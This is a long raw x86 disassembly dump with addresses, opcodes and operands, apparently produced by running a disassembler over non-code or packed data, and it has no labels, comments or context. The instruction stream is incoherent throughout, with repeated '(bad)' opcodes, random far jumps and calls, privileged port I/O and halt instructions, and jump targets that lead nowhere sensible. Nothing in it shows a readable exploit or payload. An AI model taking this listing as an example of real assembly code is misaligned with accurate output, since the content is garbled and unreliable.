  422873:	in     eax,dx
  422874:	sbb    eax,0x43e5199a
  422879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42287a:	cmp    esi,eax
  42287c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42287d:	add    BYTE PTR [eax+edi*8+0x4e],0x68
  422882:	sbb    cl,ch
  422884:	and    bl,BYTE PTR [ecx]
  422886:	jo     0x42284b
  422888:	xchg   ebp,eax
  422889:	cmp    DWORD PTR [ebx-0x5b],esp
  42288c:	js     0x42282a
  42288e:	pop    ebx
  42288f:	mov    dh,0xc5
  422891:	push   ecx
  422892:	test   esp,ebx
  422894:	or     eax,0xc8015256
  422899:	imul   ebx,DWORD PTR [ecx],0x83a7af8c
  42289f:	iret   
  4228a0:	push   ecx
  4228a1:	add    ecx,edi
  4228a3:	(bad)  
  4228a4:	jne    0x422896
  4228a6:	pop    ecx
  4228a7:	jmp    0x422873
  4228a9:	jns    0x42290c
  4228ab:	adc    ah,BYTE PTR [edx]
  4228ad:	stc    
  4228ae:	lods   eax,DWORD PTR ds:[esi]
  4228af:	aam    0xf0
  4228b1:	out    dx,eax
  4228b2:	jno    0x42287f
  4228b4:	lods   eax,DWORD PTR ds:[esi]
  4228b5:	mov    ds:0xecdc81eb,eax
  4228ba:	sub    al,0x4d
  4228bc:	cmc    
  4228bd:	xor    BYTE PTR [edx],bh
  4228bf:	jp     0x4228bb
  4228c1:	test   al,0x6b
  4228c3:	pop    eax
  4228c4:	add    eax,ebx
  4228c6:	(bad)  
  4228c8:	jg     0x42288e
  4228ca:	mov    ebx,0xb2c2374f
  4228cf:	xchg   esi,eax
  4228d0:	sbb    eax,0x6aa71621
  4228d5:	cli    
  4228d6:	ins    BYTE PTR es:[edi],dx
  4228d7:	jmp    0x5efd:0x85643f6f
  4228de:	fnsave [eax-0x19]
  4228e1:	in     al,0x1f
  4228e3:	jmp    0xd122:0x67e3bda3
  4228ea:	or     BYTE PTR [ebx-0x79],cl
  4228ed:	sbb    dl,ah
  4228ef:	sub    esp,DWORD PTR [edi]
  4228f1:	retf   0xc4bb
  4228f4:	loope  0x42292d
  4228f6:	mov    ch,0x5e
  4228f8:	adc    eax,0x56cfba1
  4228fd:	jno    0x4228bf
  4228ff:	mov    edi,esp
  422901:	xchg   edx,eax
  422902:	in     al,0x7c
  422904:	pop    edi
  422905:	xchg   ebp,eax
  422906:	out    dx,eax
  422907:	add    eax,0x4b4130b
  42290c:	adc    esp,edx
  42290e:	sti    
  42290f:	jb     0x422983
  422911:	(bad)  
  422912:	fcmovbe st,st(0)
  422914:	nop
  422915:	mov    ds:0x2c93b47b,eax
  42291a:	mov    ds:0xb0e1e853,eax
  42291f:	push   esp
  422920:	sub    DWORD PTR [edx+0x4b],ecx
  422923:	outs   dx,DWORD PTR ds:[esi]
  422924:	add    al,0xa4
  422926:	retf   
  422927:	in     eax,dx
  422928:	mov    ds:0x9749097e,al
  42292d:	js     0x4229aa
  42292f:	mov    edx,0xbc7bde0b
  422934:	push   ss
  422935:	fnstenv [edx]
  422937:	fs loope 0x42291c
  42293a:	mov    dh,0x13
  42293c:	inc    ebx
  42293d:	test   eax,0x4859952c
  422942:	stos   BYTE PTR es:[edi],al
  422943:	push   es
  422944:	mov    bl,0x1c
  422946:	pop    ebp
  422947:	(bad)  
  422948:	jge    0x4229a9
  42294a:	cli    
  42294b:	xchg   edx,eax
  42294c:	or     DWORD PTR [eax],esp
  42294e:	bswap  edi
  422950:	fld    TBYTE PTR [ebp-0x58]
  422953:	cmc    
  422954:	mov    DWORD PTR [ebp-0x4b],esp
  422957:	test   al,0xc6
  422959:	inc    eax
  42295a:	aaa    
  42295b:	jbe    0x42295a
  42295d:	or     ecx,ecx
  42295f:	(bad)  
  422960:	retf   0x8a69
  422963:	jmp    0x422997
  422965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422966:	sti    
  422967:	shl    BYTE PTR [eax],1
  422969:	aaa    
  42296a:	sti    
  42296b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42296d:	ret    0x4c3b
  422970:	jecxz  0x4229d4
  422972:	mov    edi,0xea529e64
  422977:	(bad)  
  422978:	neg    BYTE PTR [ebx]
  42297a:	or     eax,0xe79dfc29
  42297f:	mov    eax,0xb090f11
  422984:	fld    st(1)
  422986:	xchg   esp,eax
  422987:	jbe    0x4229b6
  422989:	adc    eax,0xa83cb0b4
  42298e:	pop    ebx
  42298f:	jmp    0x682b6946
  422994:	adc    DWORD PTR [eax+0x7569d27c],ebx
  42299a:	mov    eax,0xd83b8094
  42299f:	test   dh,dl
  4229a1:	je     0x422958
  4229a3:	push   ebp
  4229a4:	out    0x9f,eax
  4229a6:	xchg   edx,eax
  4229a7:	ss xchg esp,ebx
  4229aa:	pop    ss
  4229ab:	jmp    0x4229f0
  4229ad:	xchg   edi,eax
  4229ae:	mov    esi,0xa2fd4890
  4229b3:	push   ebp
  4229b4:	mul    BYTE PTR [ebx]
  4229b6:	jp     0x42299a
  4229b8:	and    al,0x63
  4229ba:	and    esi,ecx
  4229bc:	stos   BYTE PTR es:[edi],al
  4229bd:	mov    eax,ds:0xf91acb56
  4229c2:	push   esi
  4229c3:	hlt    
  4229c4:	mov    gs,ecx
  4229c6:	mov    ds:0xbdda89c7,al
  4229cb:	call   0xdedd:0x755d8b82
  4229d2:	scas   eax,DWORD PTR es:[edi]
  4229d3:	icebp  
  4229d4:	and    BYTE PTR [eax],ah
  4229d6:	cld    
  4229d7:	cmc    
  4229d8:	icebp  
  4229d9:	lss    esi,FWORD PTR [esp+ebx*8+0x1c]
  4229de:	mov    ds:0x300e970e,al
  4229e3:	fisubr WORD PTR [ecx+0x75e96c8f]
  4229e9:	sub    al,BYTE PTR [ebp-0x4d38a69b]
  4229ef:	hlt    
  4229f0:	into   
  4229f1:	iret   
  4229f2:	test   eax,0xdf28c42a
  4229f7:	nop
  4229f8:	sub    eax,0xe14d071
  4229fd:	adc    eax,DWORD PTR [eax-0x34e65313]
  422a03:	std    
  422a04:	sbb    eax,0xa047cbf9
  422a09:	jno    0x422a1a
  422a0b:	std    
  422a0c:	aam    0x9c
  422a0e:	retf   
  422a0f:	cmp    BYTE PTR [esi-0x66],bh
  422a12:	mov    ds:0x5d92678e,al
  422a17:	out    dx,eax
  422a18:	fbld   TBYTE PTR [ebx-0x14]
  422a1b:	push   esp
  422a1c:	mov    esp,0xc5dd681f
  422a21:	fwait
  422a22:	jnp    0x4229bf
  422a24:	mov    eax,0x304467c
  422a29:	vpunpckhdq ymm2,ymm3,YMMWORD PTR [ebx]
  422a2d:	push   0x2d0c289d
  422a32:	pop    ss
  422a33:	xlat   BYTE PTR ds:[ebx]
  422a34:	aad    0xc0
  422a36:	mov    esp,0x34328ee9
  422a3b:	mov    ss,WORD PTR [esi+0x2397857c]
  422a41:	test   eax,0x60468d07
  422a46:	mov    ecx,0x9e3150c6
  422a4b:	push   ss
  422a4c:	jg     0x422aa1
  422a4e:	mov    bl,0xf0
  422a50:	daa    
  422a51:	or     DWORD PTR [ecx+ecx*4-0x152ad57d],edi
  422a58:	cmp    ebx,DWORD PTR [ecx+0x23]
  422a5b:	in     eax,dx
  422a5c:	and    bh,BYTE PTR [ecx+0x53eb8a15]
  422a62:	bound  esi,QWORD PTR [edx+0x574b9ab6]
  422a68:	and    DWORD PTR [eax+0x6a],edi
  422a6b:	inc    ecx
  422a6c:	int    0xb8
  422a6e:	mov    esp,0xb98aee50
  422a73:	add    al,0x7a
  422a75:	(bad)  [ebx+0x57]
  422a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a79:	pop    edi
  422a7a:	pop    edi
  422a7b:	fmul   st(4),st
  422a7d:	dec    edi
  422a7e:	(bad)  
  422a7f:	cmp    bh,al
  422a81:	sbb    bh,BYTE PTR [esp+edx*1+0x6836cada]
  422a88:	add    DWORD PTR [esi+0x29],edx
  422a8b:	leave  
  422a8c:	lea    ecx,[ecx+0xc]
  422a8f:	stc    
  422a90:	loopne 0x422ae8
  422a92:	in     eax,dx
  422a93:	in     eax,dx
  422a94:	mov    ch,0x88
  422a96:	shl    al,1
  422a98:	stos   BYTE PTR es:[edi],al
  422a99:	xor    esi,ecx
  422a9b:	push   ds
  422a9c:	and    ecx,ecx
  422a9e:	(bad)  
  422a9f:	loopne 0x422abd
  422aa1:	gs push cs
  422aa3:	xor    bl,BYTE PTR [edx+esi*4]
  422aa6:	imul   esi,ebp,0xffffff93
  422aa9:	push   esp
  422aaa:	xchg   ebx,eax
  422aab:	xor    esi,ecx
  422aad:	and    edi,edx
  422aaf:	adc    ebx,DWORD PTR [ecx]
  422ab1:	mov    ecx,0xe55472ce
  422ab6:	in     al,0xea
  422ab8:	stos   BYTE PTR es:[edi],al
  422ab9:	retf   0xf2eb
  422abc:	neg    DWORD PTR [edx-0x2a342689]
  422ac2:	mov    cl,BYTE PTR [eax-0x14]
  422ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ac6:	cmp    dh,BYTE PTR [esi+eiz*2]
  422ac9:	loop   0x422a90
  422acb:	hlt    
  422acc:	iret   
  422acd:	ins    BYTE PTR es:[edi],dx
  422ace:	or     DWORD PTR [ebx+0x713b9dd3],edx
  422ad4:	xchg   ecx,eax
  422ad5:	add    DWORD PTR [ebx],esp
  422ad7:	outs   dx,BYTE PTR ds:[esi]
  422ad8:	xor    eax,0x75e25248
  422add:	lock mov esp,0x48929a34
  422ae3:	lea    edx,[ebp-0x6]
  422ae6:	mov    bh,0xf2
  422ae8:	push   edx
  422ae9:	mov    ebx,DWORD PTR [ecx+0x6f]
  422aec:	push   es
  422aed:	ficomp DWORD PTR [ecx]
  422aef:	int    0x66
  422af1:	popf   
  422af2:	aad    0xa2
  422af4:	xor    ebx,edi
  422af6:	rol    BYTE PTR ds:0x79efbd46,0x85
  422afd:	jmp    0x79d592e9
  422b02:	fs enter 0xd09,0xd1
  422b07:	rcl    BYTE PTR [ebx+0x20],cl
  422b0a:	call   0xbbe8de10
  422b0f:	xor    ebx,DWORD PTR [ebp-0x50302965]
  422b15:	enter  0xa5ee,0x55
  422b19:	push   es
  422b1a:	mov    cl,0x84
  422b1c:	test   BYTE PTR [ebp+0x11857ac1],dl
  422b22:	push   0xffffffe7
  422b24:	aam    0x37
  422b26:	inc    ebx
  422b27:	xchg   DWORD PTR [edx],ebx
  422b29:	jns    0x422ba2
  422b2b:	iret   
  422b2c:	mov    ah,0x7d
  422b2e:	in     al,0x46
  422b30:	push   eax
  422b31:	mov    ds:0x54f308cb,eax
  422b36:	pusha  
  422b37:	adc    ecx,esp
  422b39:	mov    dh,0x7b
  422b3b:	inc    eax
  422b3c:	sub    BYTE PTR [edi-0x4f],ch
  422b3f:	xor    al,0x3b
  422b41:	stos   BYTE PTR es:[edi],al
  422b42:	push   edx
  422b43:	pop    es
  422b44:	mov    ch,0x7e
  422b46:	shr    ebp,1
  422b48:	aad    0xb5
  422b4a:	sbb    DWORD PTR [edx],ebp
  422b4c:	push   esp
  422b4d:	leave  
  422b4e:	iret   
  422b4f:	shr    DWORD PTR [esi+0x74ca3bed],0xf
  422b56:	push   esi
  422b57:	jmp    0x1602492
  422b5c:	mov    dh,BYTE PTR [edi+0x7c1c4348]
  422b62:	mov    ecx,0xde6a36e9
  422b67:	test   ch,bl
  422b69:	popf   
  422b6a:	out    dx,eax
  422b6b:	rcl    ch,1
  422b6d:	lahf   
  422b6e:	imul   edi,DWORD PTR [esi],0x52
  422b71:	and    BYTE PTR ds:0x3512cade,cl
  422b77:	sbb    DWORD PTR [eax],esp
  422b79:	mov    DWORD PTR [eax+0x73],edx
  422b7c:	lods   eax,DWORD PTR ds:[esi]
  422b7d:	and    BYTE PTR [ebx],0x4a
  422b80:	dec    edx
  422b81:	outs   dx,DWORD PTR ds:[esi]
  422b82:	sbb    eax,0x998f699e
  422b87:	lds    ecx,FWORD PTR [esi-0x6a38aeba]
  422b8d:	mov    bh,0xbd
  422b8f:	and    bl,BYTE PTR [ecx]
  422b91:	or     DWORD PTR [edx+0x61],esi
  422b94:	inc    edi
  422b95:	mov    al,0x8f
  422b97:	mov    bh,0xd
  422b99:	stos   BYTE PTR es:[edi],al
  422b9a:	jnp    0x422b36
  422b9c:	jns    0x422b5e
  422b9e:	pop    edi
  422b9f:	mov    bl,0x53
  422ba1:	fistp  WORD PTR [eax]
  422ba3:	call   0xd212:0x6672891b
  422baa:	sbb    al,0xc0
  422bac:	sbb    DWORD PTR [edi+edi*1+0x53],edx
  422bb0:	and    edx,DWORD PTR [ecx]
  422bb2:	mov    eax,0xc794fd22
  422bb7:	push   ebx
  422bb8:	test   DWORD PTR [ecx],ebp
  422bba:	jl     0x422bb4
  422bbc:	and    DWORD PTR [ecx-0xce19723],esi
  422bc2:	cs mov es,edx
  422bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bc6:	cli    
  422bc7:	loop   0x422c10
  422bc9:	xchg   esp,eax
  422bca:	add    edx,ebx
  422bcc:	and    DWORD PTR [edi+0x1fe7ed75],esp
  422bd2:	pusha  
  422bd3:	jle    0x422bea
  422bd5:	and    BYTE PTR ds:0x5a1b910b,ah
  422bdc:	xor    esp,edi
  422bde:	mov    ch,0xf4
  422be0:	rol    BYTE PTR [esi-0x4831a364],1
  422be6:	push   ecx
  422be7:	xor    eax,0xd791252c
  422bec:	mov    edx,0x13ecd2ad
  422bf1:	push   es
  422bf2:	out    0x65,eax
  422bf4:	sbb    eax,0xa894ed7c
  422bf9:	mov    ds:0xa2eaa296,eax
  422bfe:	imul   ecx,edx,0xffffff88
  422c01:	arpl   WORD PTR [esi+0x30b12373],bx
  422c07:	mov    ch,0x4e
  422c09:	fidivr WORD PTR [esp+esi*2+0x295b6df2]
  422c10:	mov    ch,0x30
  422c12:	mov    al,ds:0x8d82bbf3
  422c17:	icebp  
  422c18:	sbb    ebx,DWORD PTR [ecx]
  422c1a:	ds pop ebx
  422c1c:	jp     0x422c11
  422c1e:	push   cs
  422c1f:	(bad)  
  422c20:	sti    
  422c21:	int3   
  422c22:	jmp    0x422c2b
  422c24:	dec    eax
  422c25:	clc    
  422c26:	or     esp,ebx
  422c28:	and    ah,BYTE PTR [esi+0x26]
  422c2b:	nop
  422c2c:	xor    DWORD PTR [eax-0x357fd5cf],esp
  422c32:	mov    edi,0x5fc62e44
  422c37:	call   0xd9d6e0b2
  422c3c:	push   cs
  422c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c3e:	sub    ah,cl
  422c40:	xchg   DWORD PTR ss:[eax-0x7e76e8ac],edi
  422c47:	shl    DWORD PTR [ecx-0x32],cl
  422c4a:	test   DWORD PTR [esi+0x48cc1284],edi
  422c50:	vmread DWORD PTR [esp+esi*1],esp
  422c54:	cmp    BYTE PTR [edi+0x4919f332],ah
  422c5a:	sti    
  422c5b:	fdivr  DWORD PTR [esi-0x330cd299]
  422c61:	jae    0x422cb2
  422c63:	sbb    BYTE PTR [ecx+ebp*8],0x3b
  422c67:	loopne 0x422c25
  422c69:	inc    ebp
  422c6a:	and    edx,DWORD PTR [ebx+eiz*1-0x67]
  422c6e:	mov    DWORD PTR [ebx+0xa],esi
  422c71:	xchg   esp,eax
  422c72:	fistp  QWORD PTR [ebx-0x50]
  422c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c76:	fwait
  422c77:	jne    0x422c83
  422c79:	icebp  
  422c7a:	ins    BYTE PTR es:[edi],dx
  422c7b:	loop   0x422c69
  422c7d:	push   0x824396c4
  422c82:	mov    ah,0x64
  422c84:	xchg   ecx,eax
  422c85:	dec    ecx
  422c86:	pop    edi
  422c87:	pop    es
  422c88:	gs xor al,0x8d
  422c8b:	jmp    0xecd20596
  422c90:	xor    BYTE PTR [ecx-0x3b408b2b],ch
  422c96:	cdq    
  422c97:	jle    0x422ccb
  422c99:	sub    BYTE PTR [eax+0x24dfa0d9],bl
  422c9f:	icebp  
  422ca0:	aad    0x97
  422ca2:	fsub   st(2),st
  422ca4:	fcmovne st,st(5)
  422ca6:	pop    ecx
  422ca7:	jmp    0x4a24:0x94730916
  422cae:	push   cs
  422caf:	adc    BYTE PTR [ecx+0x3fb32ba8],0x72
  422cb6:	sahf   
  422cb7:	and    bl,BYTE PTR [esp+ecx*1]
  422cba:	leave  
  422cbb:	hlt    
  422cbc:	(bad)  
  422cbd:	mov    ?,WORD PTR [ebp+0x586e7c14]
  422cc3:	push   esi
  422cc4:	in     eax,dx
  422cc5:	adc    BYTE PTR [ebx+esi*1-0x54],ch
  422cc9:	push   0xa8411ad1
  422cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ccf:	pusha  
  422cd0:	mov    al,BYTE PTR [ebp+0x2e]
  422cd3:	es in  al,dx
  422cd5:	test   DWORD PTR [edx+0x56120fd4],edi
  422cdb:	fwait
  422cdc:	loopne 0x422d0f
  422cde:	sbb    al,0xe5
  422ce0:	cmc    
  422ce1:	add    dl,BYTE PTR [edx-0x478486d7]
  422ce7:	ins    BYTE PTR es:[edi],dx
  422ce8:	sbb    cl,bh
  422cea:	mov    al,0x78
  422cec:	ins    BYTE PTR es:[edi],dx
  422ced:	xchg   BYTE PTR [esi],ah
  422cef:	lock int 0x87
  422cf2:	dec    ebx
  422cf3:	dec    esi
  422cf4:	imul   eax,DWORD PTR [edi+eiz*4-0x51],0xf3bb1525
  422cfc:	pop    esp
  422cfd:	sub    DWORD PTR [ecx-0x32],ebp
  422d00:	push   ds
  422d01:	cmp    esi,esi
  422d03:	fld    DWORD PTR [ecx-0x78b41889]
  422d09:	lea    ebx,[ebp-0x1c5a95af]
  422d0f:	push   edx
  422d10:	jns    0x422d28
  422d12:	cmp    ebx,DWORD PTR [ecx]
  422d14:	sbb    eax,0xc9ae9749
  422d19:	jmp    DWORD PTR [ecx+0x3e]
  422d1c:	add    eax,0x7e32bbd
  422d21:	test   DWORD PTR [edi+ebp*4+0x22],edi
  422d25:	test   DWORD PTR [edi+0x1e991f5f],ebp
  422d2b:	push   es
  422d2c:	or     DWORD PTR [eax+0x24],ecx
  422d2f:	push   0x658c8e07
  422d34:	push   es
  422d35:	push   es
  422d36:	fidiv  DWORD PTR [esi+eiz*2]
  422d39:	in     al,0xb8
  422d3b:	push   esi
  422d3c:	and    bh,cl
  422d3e:	inc    edx
  422d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d40:	aam    0x57
  422d42:	sbb    BYTE PTR [edx],al
  422d44:	mov    esp,0xfd55ba2
  422d49:	xlat   BYTE PTR ds:[ebx]
  422d4a:	cmp    bl,bl
  422d4c:	js     0x422d76
  422d4e:	lds    esp,FWORD PTR [esi]
  422d50:	xchg   edx,eax
  422d51:	mov    ds:0x482164b5,eax
  422d56:	ficom  DWORD PTR ds:0x324d8527
  422d5c:	and    edi,DWORD PTR [ecx+0x5]
  422d5f:	sbb    BYTE PTR [edx-0x6a],dl
  422d62:	fisub  DWORD PTR [ebx+0x33]
  422d65:	pop    ecx
  422d66:	in     eax,dx
  422d67:	mov    esi,0x2212f0dc
  422d6c:	sbb    DWORD PTR [esi-0x308ac311],esp
  422d72:	stos   BYTE PTR es:[edi],al
  422d73:	jmp    0x8e97:0xda28bcec
  422d7a:	es xchg edx,eax
  422d7c:	jne    0x422dac
  422d7e:	mul    esp
  422d80:	push   edx
  422d81:	test   eax,0x7f67b59f
  422d86:	mov    ebx,0x939919bf
  422d8b:	imul   ecx,DWORD PTR [ebx+0x1e1aabdc],0xb5594989
  422d95:	pop    ebx
  422d96:	loope  0x422dd2
  422d98:	pop    ds
  422d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d9a:	pop    ebx
  422d9b:	test   al,0x1c
  422d9d:	and    al,cl
  422d9f:	lar    ebp,WORD PTR [edi]
  422da2:	js     0x422e01
  422da4:	fsub   st,st(4)
  422da6:	mov    esp,0x61ad35e4
  422dab:	xor    esi,DWORD PTR [ebp+0x25]
  422dae:	aad    0xc7
  422db0:	inc    edi
  422db1:	fiadd  WORD PTR [eax+0x4758d9c3]
  422db7:	out    0xc,al
  422db9:	push   0xa43678b0
  422dbe:	mov    bh,0xb4
  422dc0:	sar    al,cl
  422dc2:	mov    DWORD PTR [eax],esp
  422dc4:	add    eax,0x8ee94801
  422dc9:	inc    ebx
  422dca:	xchg   esi,eax
  422dcb:	or     al,0x1b
  422dcd:	or     DWORD PTR [edx],ebx
  422dcf:	pushf  
  422dd0:	pushf  
  422dd1:	inc    ebp
  422dd2:	or     eax,0xf34718b8
  422dd7:	nop
  422dd8:	out    0xad,al
  422dda:	int    0x62
  422ddc:	or     cl,BYTE PTR [edi+0xeb7a198]
  422de2:	mov    ebp,0x4d191876
  422de7:	out    dx,al
  422de8:	adc    ebx,DWORD PTR [edx-0x4213083]
  422dee:	cmp    al,0x80
  422df0:	mov    al,0xa5
  422df2:	or     esi,DWORD PTR [eax+0x7d]
  422df5:	(bad)  
  422df6:	dec    edx
  422df7:	dec    eax
  422df8:	and    eax,0x1f8517a9
  422dfd:	xor    eax,0xa74652fd
  422e02:	or     ebx,DWORD PTR [edi+eiz*1]
  422e05:	cmp    BYTE PTR [ebx],dh
  422e07:	cs adc eax,0xba423771
  422e0d:	ja     0x422da4
  422e0f:	mov    bl,0x32
  422e11:	xchg   esi,eax
  422e12:	mov    esi,0x2307374
  422e17:	mov    cl,bh
  422e19:	or     DWORD PTR [ebx],eax
  422e1b:	loope  0x422dca
  422e1d:	inc    ecx
  422e1e:	ret    0xa2b4
  422e21:	fbld   TBYTE PTR [edi-0x77]
  422e24:	sbb    cl,BYTE PTR [ecx]
  422e26:	stc    
  422e27:	retf   0xa939
  422e2a:	popf   
  422e2b:	inc    BYTE PTR [edi-0x628b845e]
  422e31:	xchg   esp,eax
  422e32:	int    0xfe
  422e34:	arpl   WORD PTR [edi-0x40],ax
  422e37:	or     cl,cl
  422e39:	sbb    BYTE PTR [esi-0x40554bdc],bh
  422e3f:	ss inc edi
  422e41:	sub    al,0xd9
  422e43:	mov    ecx,0x60f7ccc2
  422e48:	lea    esp,[ebx+0x2f]
  422e4b:	stc    
  422e4c:	dec    ebx
  422e4d:	dec    edi
  422e4e:	ja     0x422e43
  422e50:	dec    edx
  422e51:	push   0xffffffbd
  422e53:	inc    esp
  422e54:	sbb    al,0x80
  422e56:	inc    eax
  422e57:	sbb    DWORD PTR ds:0xde7a7d2,edx
  422e5d:	pop    edx
  422e5e:	push   cs
  422e5f:	mov    ch,0x19
  422e61:	test   eax,0x6093e611
  422e66:	cmp    eax,edx
  422e68:	lahf   
  422e69:	ins    BYTE PTR es:[edi],dx
  422e6a:	out    dx,al
  422e6b:	dec    ecx
  422e6c:	push   ds
  422e6d:	push   ecx
  422e6e:	outs   dx,DWORD PTR ds:[esi]
  422e6f:	es mov esi,0x9410beb3
  422e75:	sub    eax,0x525104b5
  422e7a:	cmp    dh,0x25
  422e7d:	out    dx,al
  422e7e:	loop   0x422e74
  422e80:	(bad)  [ebx-0x1f]
  422e83:	fldenv ds:0x1eae5e72
  422e89:	dec    ecx
  422e8a:	mov    ds:0x38d6018c,eax
  422e8f:	xchg   ebp,eax
  422e90:	add    DWORD PTR [edx-0xfadbf5],ebp
  422e96:	std    
  422e97:	jo     0x422ed1
  422e99:	mov    dl,0x2
  422e9b:	das    
  422e9c:	add    edx,ebx
  422e9e:	or     ah,BYTE PTR [esi]
  422ea0:	sub    BYTE PTR [ebx-0x42],al
  422ea3:	xchg   esp,eax
  422ea4:	mov    WORD PTR ds:0xde157279,ds
  422eaa:	jbe    0x422e93
  422eac:	stc    
  422ead:	and    edi,DWORD PTR [ebx+0x18]
  422eb0:	mov    bl,0x7c
  422eb2:	add    DWORD PTR [ecx-0x32],eax
  422eb5:	sub    al,0x6c
  422eb7:	sub    DWORD PTR [edi],edx
  422eb9:	rcr    ebp,1
  422ebb:	mov    ds:0xde6b8703,eax
  422ec0:	data16 jns 0x422ed3
  422ec3:	setl   BYTE PTR fs:[eax-0x1396243d]
  422ecb:	inc    edi
  422ecc:	mov    bl,0xcb
  422ece:	mov    al,0x84
  422ed0:	fs push 0x3e
  422ed3:	test   DWORD PTR [ecx],ecx
  422ed5:	jmp    0x422efe
  422ed7:	test   eax,0xbcbbc23f
  422edc:	ss fsubrp st(2),st
  422edf:	rol    DWORD PTR [ebp-0x43],1
  422ee2:	mov    eax,0x44f18db4
  422ee7:	rcl    ch,cl
  422ee9:	sbb    DWORD PTR [edx],ebx
  422eeb:	in     eax,dx
  422eec:	xor    BYTE PTR [edx+0x79],0xc7
  422ef0:	jecxz  0x422f2a
  422ef2:	bound  esp,QWORD PTR [ebp-0x7]
  422ef5:	std    
  422ef6:	mov    ebp,0x8628f744
  422efb:	adc    eax,0x17e49b6d
  422f00:	adc    al,0x9f
  422f02:	mov    ecx,edx
  422f04:	(bad)  
  422f05:	adc    bl,dl
  422f07:	(bad)  
  422f08:	inc    esp
  422f09:	pop    es
  422f0a:	add    BYTE PTR [eax+0x14b2b6bb],al
  422f10:	int    0xc9
  422f12:	(bad)
  422f16:	and    edi,0xaa1b28e1
  422f1c:	sbb    ecx,ebx
  422f1e:	aam    0xd0
  422f20:	mov    WORD PTR [edx],es
  422f22:	fdiv   DWORD PTR [edi-0x2dc26824]
  422f28:	daa    
  422f29:	cdq    
  422f2a:	sti    
  422f2b:	push   es
  422f2c:	cmp    esi,ebp
  422f2e:	dec    esp
  422f2f:	inc    ecx
  422f30:	pop    ss
  422f31:	dec    ecx
  422f32:	dec    ebp
  422f33:	shl    BYTE PTR gs:[esi],cl
  422f36:	xchg   ebp,eax
  422f37:	test   eax,0x9c6ba310
  422f3c:	mov    DWORD PTR [edi+0x1f],ebp
  422f3f:	hlt    
  422f40:	pushf  
  422f41:	out    0xaf,al
  422f43:	add    ebp,DWORD PTR [ebx]
  422f45:	cmp    DWORD PTR [esi*1+0x5863e11f],eax
  422f4c:	sbb    BYTE PTR [esi-0x1ddde725],0xea
  422f53:	jg     0x422fc4
  422f55:	iret   
  422f56:	adc    cl,dh
  422f58:	dec    edi
  422f59:	cmp    BYTE PTR [esp+edx*1+0x3cbbb236],0x75
  422f61:	imul   ebp,DWORD PTR [esi+edi*8+0x3edd745d],0xb194dff2
  422f6c:	outs   dx,DWORD PTR ds:[esi]
  422f6d:	mov    ch,0xad
  422f6f:	in     eax,0x1
  422f71:	mov    esi,0xd09edd7
  422f76:	cmp    al,0xfa
  422f78:	imul   eax,DWORD PTR fs:[eax+0x41],0xef7ca661
  422f80:	dec    eax
  422f81:	pop    ecx
  422f82:	sbb    edi,DWORD PTR ds:[ebx+0x735c0983]
  422f89:	mov    ds:0xcc366947,eax
  422f8e:	adc    ah,al
  422f90:	sub    DWORD PTR [ebx+0x75],ecx
  422f93:	cmp    esi,esp
  422f95:	cmp    al,0x78
  422f97:	pop    esp
  422f98:	or     BYTE PTR [ebx-0x57ce8d48],cl
  422f9e:	call   0x345bee6e
  422fa3:	jl     0x422f71
  422fa5:	aas    
  422fa6:	mov    edx,0xb48679d5
  422fab:	fs call 0x1ccc2f15
  422fb1:	stc    
  422fb2:	dec    esi
  422fb3:	xor    dh,BYTE PTR [esi]
  422fb5:	popa   
  422fb6:	xor    eax,0xb7e948c1
  422fbb:	ja     0x422f96
  422fbd:	out    0x37,al
  422fbf:	sbb    al,0xef
  422fc1:	ror    edi,0x6f
  422fc4:	mov    WORD PTR [ebx+ebp*2-0x57007302],ds
  422fcb:	ret    0x4e1
  422fce:	push   ebx
  422fcf:	arpl   sp,cx
  422fd1:	icebp  
  422fd2:	iret   
  422fd3:	xor    al,0xc1
  422fd5:	(bad)  
  422fd6:	(bad)  
  422fd8:	pop    ebp
  422fd9:	pop    eax
  422fda:	inc    edi
  422fdb:	jae    0x423052
  422fdd:	stc    
  422fde:	sub    ecx,0xc
  422fe1:	mov    ecx,DWORD PTR [edi-0x7716e4b0]
  422fe7:	mov    dh,0x8e
  422fe9:	test   DWORD PTR [ebx],0xdba64089
  422fef:	in     eax,0x43
  422ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ff2:	ret    0x36b9
  422ff5:	cmc    
  422ff6:	inc    edi
  422ff7:	push   ebx
  422ff8:	xor    al,0x59
  422ffa:	es mov ch,0x90
  422ffd:	adc    ch,BYTE PTR [esi-0x467630cb]
  423003:	out    0x55,eax
  423005:	mov    esi,0x660e7eb
  42300a:	mov    edi,0xacb98fbd
  42300f:	mov    cl,0x25
  423011:	es mov esi,0xd79956da
  423017:	in     eax,0x28
  423019:	fwait
  42301a:	mov    ebx,0x6adc1cd2
  42301f:	fnstenv [eax-0x58]
  423022:	and    al,0x2b
  423024:	jmp    0x42300d
  423026:	and    esp,DWORD PTR ds:0xf08f0a23
  42302c:	lods   al,BYTE PTR ds:[esi]
  42302d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42302e:	cmp    esp,DWORD PTR ds:0xfda5a1d8
  423034:	push   edi
  423035:	nop
  423036:	inc    esi
  423037:	and    DWORD PTR [esi],edx
  423039:	pop    ecx
  42303a:	mov    esi,0x47b0bc63
  42303f:	repnz xor al,0x9b
  423042:	mov    edx,DWORD PTR [edx]
  423044:	dec    esp
  423045:	mov    bl,dl
  423047:	adc    DWORD PTR [ecx+eax*4-0x54],esp
  42304b:	ss inc esi
  42304d:	dec    ecx
  42304e:	mov    al,0xf4
  423050:	jecxz  0x4230a8
  423052:	xor    bl,BYTE PTR [edx]
  423054:	xor    eax,0x46eb7bc4
  423059:	enter  0x9650,0x22
  42305d:	pusha  
  42305e:	lock int 0xbb
  423061:	pop    esi
  423062:	mov    dh,0x24
